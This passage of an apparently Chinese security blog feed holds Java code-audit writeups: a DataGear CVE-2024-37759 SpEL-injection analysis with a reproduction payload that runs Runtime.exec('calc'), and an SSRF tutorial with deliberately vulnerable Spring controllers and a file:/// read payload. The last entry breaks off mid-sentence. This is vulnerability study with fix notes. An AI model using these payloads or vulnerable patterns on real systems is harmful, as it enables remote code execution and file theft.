url">www.xxx.xxx.com/aiis/h5/pc-client/#/qrcode?url=https%3A%2F%2Fn.com%2Faiis%2FinvestmentAdvisor<br></code></pre></td></tr></table></figure><ol start="2"><li>修改该地址为 <a href="https://www.baidu.com/">https://www.baidu.com</a> 修改完成后，刷新该界面</li></ol><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240718133729-d2eb1be2-44c7-1.png"></p><ol start="3"><li>然后就直接使用我们的手机扫描二维码，直接跳转到修改的地址</li></ol><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240718135621-753f023a-44ca-1.png"></p><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>漏洞学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-37759 SpEL注入</title>
    <link href="/2025/07/27/CVE-2024-37759%20SpEL%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/07/27/CVE-2024-37759%20SpEL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>DataGear 是一款开源免费的数据可视化分析平台，允许用户自由制作数据看板，支持接入 SQL、CSV、Excel、HTTP 接口、JSON 等多种数据源。</p><p>DataGear v5.0.0 存在 SpEL 表达式注入漏洞，可导致远程代码执行。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h3><p>地址：<a href="https://github.com/datageartech/datagear">datageartech&#x2F;datagear: DataGear数据可视化分析平台，自由制作任何您想要的数据看板 (github.com)</a></p><h3 id="数据库准备"><a href="#数据库准备" class="headerlink" title="数据库准备"></a>数据库准备</h3><ol><li>安装 MySQL 8.0 数据库，并将 root 用户的密码设置为：root（或修改 test&#x2F;config&#x2F;jdbc.properties 配置）</li><li>新建测试数据库，名称为：dg_test</li><li>使用 test&#x2F;sql&#x2F;test-mysql.sql 脚本初始化 dg_test 库</li></ol><h3 id="编译运行"><a href="#编译运行" class="headerlink" title="编译运行"></a>编译运行</h3><p>项目是典型的 Spring Boot 项目。在 IDE 中打开项目，使用 Maven 编译，运行 org.datagear.webapp.DataGearApplication 即可启动。</p><p>项目启动后访问地址：<a href="http://localhost:50401/">http://localhost:50401</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="项目漏洞点"><a href="#项目漏洞点" class="headerlink" title="项目漏洞点"></a>项目漏洞点</h3><p>org.datagear.persistence.support.ConversionSqlParamValueMapper#evaluateVariableExpression 方法中，存在 org.springframework.expression.common.TemplateAwareExpressionParser#parseExpression(java.lang.String) 的调用。</p><p><img src="/img/CVE-2024-37759/C01.png"></p><p>此方法主要用于计算expression的值</p><p>如果其中的参数 expression 可控，这个漏洞点就可能被利用。接下来需要找出调用 evaluateVariableExpression 的地方。</p><h3 id="触发漏洞点的调用链"><a href="#触发漏洞点的调用链" class="headerlink" title="触发漏洞点的调用链"></a>触发漏洞点的调用链</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">org.datagear.web.controller.DataController<span class="hljs-comment">#view</span><br>org.datagear.persistence.support.DefaultPersistenceManager<span class="hljs-comment">#get(java.sql.Connection, org.datagear.persistence.Dialect, org.datagear.meta.Table, org.datagear.persistence.Row, org.datagear.persistence.SqlParamValueMapper, org.datagear.persistence.RowMapper)</span><br>org.datagear.persistence.support.DefaultPersistenceManager<span class="hljs-comment">#buildUniqueRecordCondition</span><br>org.datagear.persistence.support.DefaultPersistenceManager<span class="hljs-comment">#mapToSqlParamValue</span><br>org.datagear.persistence.support.ConversionSqlParamValueMapper<span class="hljs-comment">#map</span><br>org.datagear.persistence.support.ConversionSqlParamValueMapper<span class="hljs-comment">#resolveExpressionIf</span><br>org.datagear.persistence.support.ConversionSqlParamValueMapper<span class="hljs-comment">#evaluateVariableExpressions</span><br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2024-37759/C11.png"></p><h3 id="寻找调用链过程"><a href="#寻找调用链过程" class="headerlink" title="寻找调用链过程"></a>寻找调用链过程</h3><p>全局搜索evaluateVariableExpression方法</p><p>发现evaluateVariableExpressions方法(主要用于判断表达式的值是否需要计算)，调用此方法</p><p>继续跟进，找到resolveExpressionIf方法调evaluateVariableExpressions方法</p><p><img src="/img/CVE-2024-37759/C02.png"></p><p>ai了一下此段代码含义，主要是用于判断传入的是否有表达式，会先计算表达式，再拼接到sql语句中执行</p><p>大致流程图</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 如果不是字符串 → 直接返回<br>2. 否则：<br>   a. 如果启用变量表达式：<br>       - 提取并求值 → 替换为结果<br>       - 如果没有表达式但有转义字符 → 反转义<br>   b. 如果启用 SQL 表达式：<br>       - 提取并求值 → 替换为结果<br>       - 如果没有表达式但有转义字符 → 反转义<br>3. 返回最终值<br></code></pre></td></tr></table></figure><ul><li>输入值为 <code>$&#123;user.name&#125;</code>，系统会先替换 <code>$&#123;user.name&#125;</code> 为真实用户名字。</li><li>若替换后为 <code>SELECT COUNT(*) FROM log WHERE user=&#39;张三&#39;</code>，再解析 <code>#&#123;...&#125;</code> 表达式并执行 SQL。</li><li>可嵌套执行，先变量、后 SQL。</li></ul><p>继续搜索resolveExpressionIf方法，发现map方法调用此方法</p><p><img src="/img/CVE-2024-37759/C03.png"></p><p>此代码执行流程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 如果值为 null，直接返回 null 参数封装<br>2. 否则：<br>   a. 执行表达式解析（变量 / SQL 表达式）<br>   b. 如果解析后是 SqlParamValue 类型 → 直接返回<br>   c. 否则将值封装为 SqlParamValue<br>3. 捕获异常：<br>   a. 映射异常原样抛出<br>   b. 其他异常封装并抛出（含表、列、值信息）<br></code></pre></td></tr></table></figure><p>主要用于将一个原始值（可能是表达式）转换为 <code>SqlParamValue</code> 类型，用于数据库操作。</p><p>继续查找用法，发现org&#x2F;datagear&#x2F;persistence&#x2F;support&#x2F;DefaultPersistenceManager.java</p><p>mapToSqlParamValue方法中调用了map方法</p><p><img src="/img/CVE-2024-37759/C04.png"></p><p>提取出关键代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (mapper == <span class="hljs-literal">null</span>)<br>    sqlParamValue = createSqlParamValue(column, value);<br><span class="hljs-keyword">else</span><br>    sqlParamValue = mapper.map(cn, table, column, value);<br></code></pre></td></tr></table></figure><p>如果没有传入 <code>mapper</code>，使用默认的方式创建 <code>SqlParamValue</code>；</p><p>否则，调用外部提供的 <code>mapper</code> 的 <code>map()</code> 方法执行自定义映射。</p><p>这里应该控制传入mapper为ConversionSqlParamValueMapper才可调用我们需要的map方法</p><p>继续查找用法，来到的buildUniqueRecordCondition方法</p><p><img src="/img/CVE-2024-37759/C05.png"></p><p>没有什么特殊的条件</p><p>此方法用途</p><table><thead><tr><th>功能</th><th>描述</th></tr></thead><tbody><tr><td>构造 SQL 条件</td><td>基于唯一列生成精确匹配条件</td></tr><tr><td>支持 null 值处理</td><td>自动使用 <code>IS NULL</code></td></tr><tr><td>支持嵌套 SQL</td><td>对字面量 SQL 做合法性校验</td></tr><tr><td>安全</td><td>值通过参数绑定，避免 SQL 注入</td></tr></tbody></table><p>生成 SQL 示例</p><p>假设唯一字段为 <code>id, name</code>，对应数据为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">id = <span class="hljs-number">1001</span><br>name = <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>生成的 SQL 条件将为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id <span class="hljs-operator">=</span> ? <span class="hljs-keyword">AND</span> name <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span><br></code></pre></td></tr></table></figure><p>绑定参数列表为：<code>[1001]</code></p><p>继续跟进，看到get方法调用此方法</p><p><img src="/img/CVE-2024-37759/C06.png"></p><p>执行流程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 检查表合法性<br>2. 获取数据库方言<br>3. 创建 SQL 查询语句（SELECT * FROM ... WHERE ...）<br>4. 将唯一字段从 param 映射为 SQL 条件<br>5. 执行查询，结果映射为 Row 列表<br>6. 判断返回结果数量：<br>   - 1 条 → 返回<br>   - 0 条 → null<br>   - &gt;1 条 → 抛出 NonUniqueResultException<br>7. 最终释放资源<br></code></pre></td></tr></table></figure><p>例如，你要从 <code>user</code> 表中根据 <code>id=1001</code> 查询一个用户：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Row</span> <span class="hljs-variable">row</span> <span class="hljs-operator">=</span> get(cn, <span class="hljs-literal">null</span>, userTable, Row.of(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-number">1001</span>), defaultMapper, rowMapper);<br></code></pre></td></tr></table></figure><p>返回结果可能是：</p><ul><li>找到唯一用户 → 返回 <code>Row</code> 对象</li><li>没有该用户 → 返回 <code>null</code></li><li>id 字段不是唯一的（异常）→ 抛出 <code>NonUniqueResultException</code></li></ul><p>继续查找利用点</p><p>来到org&#x2F;datagear&#x2F;web&#x2F;controller&#x2F;DataController.java </p><p>view方法</p><p><img src="/img/CVE-2024-37759/C07.png"></p><p>可以看到调用了persistenceManager.get</p><p>org.datagear.web.controller.DataController#view 是查看数据库表中一条记录的入口方法。其逻辑是根据传入的参数查询表，即 SELECT * FROM table WHERE paramName &#x3D; paramValue。</p><p>但在构造这个 SQL 查询语句时，会对 paramValue 进行处理。它会根据是否包含 “#{“ 等特殊字符来判断是否为表达式。如果是表达式，就会进行计算后再拼接到 SQL 中。（这个逻辑在 org.datagear.persistence.support.ConversionSqlParamValueMapper#resolveExpressionIf 中）此外，还需要 ConversionSqlParamValueMapper 启用变量表达式特性。</p><p>构造的恶意数据库（具体见漏洞复现）就是利用这个逻辑，传入参数 {“name”:”#{T(java.lang.String).forName(‘java.lang.Runtime’).getRuntime().exec(‘calc’)}”}。其中的 #{T(java.lang.String).forName(‘java.lang.Runtime’).getRuntime().exec(‘calc’)} 符合表达式形式，会进入 parseExpression 进行计算，从而触发命令执行。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="第一步：准备恶意数据库表"><a href="#第一步：准备恶意数据库表" class="headerlink" title="第一步：准备恶意数据库表"></a>第一步：准备恶意数据库表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> DATABASE evil;<br><br><span class="hljs-keyword">CREATE TABLE</span> `evil` (<br>  `name` <span class="hljs-type">varchar</span>(<span class="hljs-number">209</span>) <span class="hljs-keyword">COLLATE</span> utf8mb4_unicode_ci <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span><br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_unicode_ci;<br><br><span class="hljs-keyword">INSERT INTO</span> `evil` <span class="hljs-keyword">VALUES</span> (&quot;#&#123;T(java.lang.String).forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;);<br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2024-37759/C08.png"></p><h3 id="第二步：添加恶意数据库源"><a href="#第二步：添加恶意数据库源" class="headerlink" title="第二步：添加恶意数据库源"></a>第二步：添加恶意数据库源</h3><ol><li>登录 <a href="http://localhost:50401/">http://localhost:50401</a>，默认账号密码为 admin&#x2F;admin。</li><li>在架构添加界面中添加此 MySQL 数据库：<code>/schema/saveAdd</code>。</li><li>选择”数据源”—“数据源添加”，填写刚才创建的恶意数据库地址。</li></ol><p><img src="/img/CVE-2024-37759/C09.png"></p><h3 id="第三步：触发漏洞执行代码"><a href="#第三步：触发漏洞执行代码" class="headerlink" title="第三步：触发漏洞执行代码"></a>第三步：触发漏洞执行代码</h3><p>打开刚才添加的数据库，然后单击”查看”按钮，将执行 SpEL 表达式</p><p><img src="/img/CVE-2024-37759/C10.png"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>DataGear 在 v5.1.0 中修复了这个漏洞。</p><p>修复方案利用了前面提到的 ConversionSqlParamValueMapper 中的变量表达式特性。新的逻辑直接关闭了这个特性，全部按照字符串处理，不再对表达式进行解析。</p><p>注：可以使用 SimpleEvaluationContext 来限制可执行注入的 SpEL 表达式。</p><p>创建一个 受限的表达式执行环境，默认：</p><ul><li>只允许读取属性、调用 getter 方法</li><li>不允许调用任意方法（如 <code>System.exit()</code> 这种危险操作）</li><li>适合暴露给不可信的用户输入（安全）</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://forum.butian.net/article/590">https://forum.butian.net/article/590</a></p>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计中的SSRF</title>
    <link href="/2025/07/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SSRF/"/>
    <url>/2025/07/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SSRF/</url>
    
    <content type="html"><![CDATA[<h2 id="Java代码审计中的SSRF"><a href="#Java代码审计中的SSRF" class="headerlink" title="Java代码审计中的SSRF"></a>Java代码审计中的SSRF</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>Java的SSRF利用方式比较局限</p><ul><li>利用file协议任意文件读取。</li><li>利用http协议端口探测</li></ul><h4 id="网络请求支持的协议"><a href="#网络请求支持的协议" class="headerlink" title="网络请求支持的协议"></a>网络请求支持的协议</h4><p>Java网络请求支持的协议可通过下面几种方法检测：</p><ul><li>代码中遍历协议</li><li>官方文档中查看</li><li><code>import sun.net.www.protocol</code>查看</li></ul><p>从<code>import sun.net.www.protocol</code>可以看到，支持以下协议</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span> <span class="hljs-keyword">ftp</span> mailto <span class="hljs-keyword">http</span> <span class="hljs-keyword">https</span> jar netdoc<br></code></pre></td></tr></table></figure><p><img src="/img/ssrf/ss01.png"></p><h4 id="发起网络请求的类"><a href="#发起网络请求的类" class="headerlink" title="发起网络请求的类"></a>发起网络请求的类</h4><p>当然，SSRF是由发起网络请求的方法造成。所以先整理Java能发起网络请求的类。</p><ul><li>HttpClient</li><li>Request(对HttpClient封装后的类)</li><li>HttpURLConnection</li><li>URLConnection</li><li>URL</li><li>okhttp</li></ul><p>如果发起网络请求的类是带HTTP开头，那只支持HTTP、HTTPS协议。</p><p>比如：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino">HttpURLConnection<br><span class="hljs-built_in">HttpClient</span><br>Request<br>okhttp<br></code></pre></td></tr></table></figure><p>所以，如果用以下类的方法发起请求，则支持<code>sun.net.www.protocol</code>所有协议</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">URLConnection</span><br><span class="hljs-attribute">URL</span><br></code></pre></td></tr></table></figure><p>注意，Request类对HttpClient进行了封装。类似Python的requests库。<br>用法及其简单，一行代码就可以获取网页内容。</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-built_in">Request</span>.<span class="hljs-keyword">Get</span>(url).<span class="hljs-keyword">execute</span>().returnContent().<span class="hljs-keyword">to</span><span class="hljs-built_in">String</span>();<br></code></pre></td></tr></table></figure><h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><h5 id="SSRF中的内网检测"><a href="#SSRF中的内网检测" class="headerlink" title="SSRF中的内网检测"></a>SSRF中的内网检测</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.ssfr.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SsrfController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/ssrf&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">fetchUrl</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String url)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">html</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br>            <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">httpUrl</span> <span class="hljs-operator">=</span> (HttpURLConnection) u.openConnection();<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(httpUrl.getInputStream(), <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>            String line;<br>            <span class="hljs-keyword">while</span> ((line = base.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                html.append(line);<br>            &#125;<br>            base.close();<br>            <span class="hljs-keyword">return</span> html.toString();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;请求失败&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在代码中<code>HttpURLConnection httpUrl = (HttpURLConnection) urlConnection;</code>，这个地方进行了强制转换，去某度搜索了一下具体用意。得出结论：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">URLConnection:可以走邮件、文件传输协议。<br>HttpURLConnection 只能走浏览器的HTTP协议<br></code></pre></td></tr></table></figure><p>也就是说使用了强转为HttpURLConnection后，利用中只能使用http协议去探测该服务器内网的其他应用。</p><p>使用百度做测试</p><p><img src="/img/ssrf/ss02.png"></p><p>无法读取文件，因为这里只支持http和https的协议。</p><p><img src="/img/ssrf/ss03.png"></p><p>下面来试试不强制转换成HttpURLConnection</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/ssrfServlet&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handleRequest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url)</span> &#123;<br>        String htmlContent;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">html</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);  <span class="hljs-comment">// 实例化url对象</span><br>            <span class="hljs-type">URLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> u.openConnection();  <span class="hljs-comment">// 打开连接</span><br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(urlConnection.getInputStream(), <span class="hljs-string">&quot;UTF-8&quot;</span>)<br>            );  <span class="hljs-comment">// 读取资源内容</span><br>            <span class="hljs-keyword">while</span> ((htmlContent = base.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                html.append(htmlContent);  <span class="hljs-comment">// 拼接内容</span><br>            &#125;<br>            base.close();<br>            <span class="hljs-keyword">return</span> html.toString();  <span class="hljs-comment">// 返回HTML内容</span><br>            <br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;请求失败&quot;</span>;<br>        &#125;<br><br></code></pre></td></tr></table></figure><p>是能够成功读取文件的</p><p><img src="/img/ssrf/ss04.png"></p><h5 id="SSRF中的读取文件"><a href="#SSRF中的读取文件" class="headerlink" title="SSRF中的读取文件"></a>SSRF中的读取文件</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/readfileServlet&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).openStream();<br>             <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream()) &#123;<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> len;<br>            <span class="hljs-keyword">while</span> ((len = inputStream.read(buffer)) &gt; <span class="hljs-number">0</span>) &#123;<br>                outputStream.write(buffer, <span class="hljs-number">0</span>, len);<br>            &#125;<br>            outputStream.flush();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            response.setStatus(<span class="hljs-number">500</span>); <span class="hljs-comment">// 设置服务器错误状态</span><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>和上面的代码对比一下，发现其实都大致相同，唯一不同的地方是一个是用openStream方法获取对象，一个是用openConnection获取对象。两个方法类似</p><p><img src="/img/ssrf/ss05.png"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1:8080//downloadServlet?url=file:///C:%5c%5c1.txt<br></code></pre></td></tr></table></figure><p><strong>注意：</strong> 这里是三个斜杆，并且反斜杠需要url编码 否则就会报错</p><h5 id="SSRF中的文件下载"><a href="#SSRF中的文件下载" class="headerlink" title="SSRF中的文件下载"></a>SSRF中的文件下载</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//文件下载</span><br>    <span class="hljs-meta">@GetMapping(&quot;/download&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">downloadFile</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url,</span><br><span class="hljs-params">                             HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1.txt&quot;</span>;<br>        response.setHeader(<span class="hljs-string">&quot;content-disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span> + filename);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).openStream();<br>             <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream()) &#123;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> len;<br>            <span class="hljs-keyword">while</span> ((len = inputStream.read(bytes)) &gt; <span class="hljs-number">0</span>) &#123;<br>                outputStream.write(bytes, <span class="hljs-number">0</span>, len);<br>            &#125;<br>        &#125;<br>    &#125;    <br></code></pre></td></tr></table></figure><p>与读取文件不同的是响应头</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">response.setHeader(<span class="hljs-string">&quot;content-disposition&quot;</span>, <span class="hljs-string">&quot;attachment;fileName=&quot;</span> + filename);<br></code></pre></td></tr></table></figure><p>设置响应头，告诉浏览器这是一个附件，下载时保存为 